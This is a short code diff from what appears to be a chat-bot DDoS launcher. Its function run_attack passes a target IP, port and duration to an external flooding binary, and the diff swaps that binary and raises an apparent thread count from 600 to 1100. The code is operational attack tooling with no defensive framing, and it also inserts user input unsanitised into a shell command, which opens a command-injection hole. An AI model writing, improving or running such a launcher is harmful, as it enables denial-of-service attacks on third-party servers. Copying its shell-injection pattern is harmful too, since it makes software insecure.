@@ -134,7 +134,7 @@ async def run_attack(chat_id, ip, port, time):
     try:
         # Execute the attack command using a subprocess
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {time} 600",
+            f"./pushpa {ip} {port} {time} 1100",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
